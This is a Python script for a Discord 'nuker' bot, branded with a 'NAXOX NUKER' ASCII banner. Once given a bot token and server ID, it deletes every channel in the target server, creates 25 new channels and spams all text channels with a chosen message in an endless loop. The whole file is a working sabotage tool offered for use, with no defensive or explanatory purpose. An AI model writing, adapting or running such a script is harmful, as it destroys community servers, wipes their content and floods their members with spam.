import discord
import asyncio
from colorama import init, Fore

init(autoreset=True)
RED = Fore.RED

print(f"""{RED}
 ███▄    █  ▄▄▄      ▒██   ██▒ ▒█████  ▒██   ██▒    ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
 ██ ▀█   █ ▒████▄    ▒▒ █ █ ▒░▒██▒  ██▒▒▒ █ █ ▒░    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▓██  ▀█ ██▒▒██  ▀█▄  ░░  █   ░▒██░  ██▒░░  █   ░   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
▓██▒  ▐▌██▒░██▄▄▄▄██  ░ █ █ ▒ ▒██   ██░ ░ █ █ ▒    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██░   ▓██░ ▓█   ▓██▒▒██▒ ▒██▒░ ████▓▒░▒██▒ ▒██▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
░ ▒░   ▒ ▒  ▒▒   ▓▒█░▒▒ ░ ░▓ ░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░░   ░ ▒░  ▒   ▒▒ ░░░   ░▒ ░  ░ ▒ ▒░ ░░   ░▒ ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
   ░   ░ ░   ░   ▒    ░    ░  ░ ░ ░ ▒   ░    ░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
         ░       ░  ░ ░    ░      ░ ░   ░    ░              ░    ░     ░  ░      ░  ░   ░     
""")

token = input(f"{RED}Bot token: ")
server_id = int(input(f"{RED}Server ID: "))

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

client = discord.Client(intents=intents)

async def clear_channels(guild):
    for ch in guild.channels:
        try:
            await ch.delete()
            print(f"{RED}Deleted {ch.name}")
        except Exception as e:
            print(f"{RED}Can't delete {ch.name}: {e}")

async def make_channels(guild, base_name):
    for i in range(25):
        try:
            await guild.create_text_channel(f"{base_name}-{i+1}")
            print(f"{RED}Created {base_name}-{i+1}")
        except Exception as e:
            print(f"{RED}Failed to create channel {i+1}: {e}")

async def spam_channels(guild, message):
    async def spam(ch):
        while True:
            try:
                await ch.send(message)
                print(f"{RED}Spammed {ch.name}")
                await asyncio.sleep(0.3)
            except Exception as e:
                print(f"{RED}Error in {ch.name}: {e}")
                await asyncio.sleep(1)

    tasks = [asyncio.create_task(spam(ch)) for ch in guild.text_channels]
    await asyncio.gather(*tasks)

async def nuke(guild):
    base = input(f"{RED}Name for new channels: ")
    spam_msg = input(f"{RED}Spam message: ")

    await clear_channels(guild)
    await asyncio.sleep(2)
    await make_channels(guild, base)
    await asyncio.sleep(3)
    await spam_channels(guild, spam_msg)

@client.event
async def on_ready():
    print(f"{RED}Logged in as {client.user}")
    guild = client.get_guild(server_id)
    if guild is None:
        print(f"{RED}Not in server with ID {server_id}")
        await client.close()
        return
    await nuke(guild)

client.run(token)
